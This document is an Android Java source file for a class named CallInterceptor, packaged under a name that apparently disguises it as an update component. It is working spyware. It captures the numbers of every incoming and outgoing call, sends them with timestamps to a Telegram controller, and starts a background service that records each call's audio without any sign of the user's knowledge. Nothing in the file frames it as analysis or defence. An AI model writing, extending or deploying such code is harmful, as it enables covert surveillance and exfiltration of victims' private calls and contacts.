package com.kasari.update;

import android.content.*;
import android.os.Build;
import android.telephony.TelephonyManager;
import java.text.SimpleDateFormat;
import java.util.*;

public class CallInterceptor extends BroadcastReceiver {

    private static String  lastNumber  = "";
    private static boolean wasRinging  = false;

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();

        // ── Outgoing call (deprecated API 29+ but still works via READ_CALL_LOG) ─
        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            lastNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (lastNumber == null) lastNumber = "Unknown";
            wasRinging = false;
            return;
        }

        // ── Phone state change ────────────────────────────────────────────────
        if (!TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(action)) return;
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        if (state == null) return;

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            // EXTRA_INCOMING_NUMBER needs READ_CALL_LOG on API 28+
            String num = null;
            try { num = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER); }
            catch (Exception ignored) {}
            lastNumber = (num != null && !num.isEmpty()) ? num : "Unknown";
            wasRinging = true;
            TelegramController.sendMessage(
                "\uD83D\uDCDE Incoming Call: " + lastNumber);

        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            String number = (lastNumber == null || lastNumber.isEmpty()) ? "Unknown" : lastNumber;
            String type   = wasRinging ? "Incoming" : "Outgoing";
            TelegramController.sendMessage(
                "\uD83D\uDCDE Call Started (" + type + "): " + number);
            Intent recI = new Intent(ctx, VoiceRecorder.class);
            recI.setAction(VoiceRecorder.ACTION_CALL);
            recI.putExtra("number", number);
            recI.putExtra("type", type);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(recI);
            else
                ctx.startService(recI);

        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            wasRinging = false;
            Intent stopI = new Intent(ctx, VoiceRecorder.class);
            stopI.setAction(VoiceRecorder.ACTION_STOP);
            ctx.startService(stopI);
            String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                .format(new Date());
            TelegramController.sendMessage(
                "\uD83D\uDCDE Call Ended: " + lastNumber + " | " + time);
            lastNumber = "";
        }
    }
}